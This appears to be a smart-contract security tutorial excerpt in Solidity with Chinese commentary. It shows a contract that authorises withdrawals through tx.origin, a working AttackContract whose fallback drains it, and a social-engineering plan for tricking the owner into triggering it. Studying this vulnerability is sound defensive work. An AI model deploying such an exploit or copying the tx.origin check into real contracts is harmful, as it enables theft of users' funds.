//原合约Phishable.sol
contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner; 
    }

    function () public payable {} // collect ETHer

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(this.balance); 
    }
}

/****************************************************/

//Attacker.sol
import "Phishable.sol";

contract AttackContract { 

    Phishable phishableContract; 
    address attacker; // 攻击者地址接收资金
    //构造函数
    constructor (Phishable _phishableContract, address _attackerAddress) { 
        phishableContract = _phishableContract; 
        attacker = _attackerAddress;
    }

    function () { 
        phishableContract.withdrawAll(attacker); 
    }
}



攻击者会先部署attacker.sol，然后说服 Phishable 合约的所有者发送一定数量的 ETH 到这个恶意合约。
攻击者可能把这个合约伪装成他们自己的私人地址，或者对受害人进行社会工程学攻击让后者发送某种形式的交易。
受害者除非很小心，否则可能不会注意到目标地址上有代码，或者攻击者可能将其伪装为多重签名钱包或某些高级存储钱包。

只要受害者向 AttackContract 地址发送了一个交易（有足够的 Gas），
它将调用 fallback函数，后者又以 attacker 为参数，调用 Phishable 合约中的 withdrawAll() 函数。
这将导致所有资金从 Phishable 合约中撤回到 attacker 的地址。这是因为，首先初始化调用的地址是受害者（即 Phishable 合约中的 owner ）。
因此， tx.origin 将等于 owner 、 Phishable 合约中 [11]行 中的 require 要求会通过，（合约中的钱可以全部被取出）。
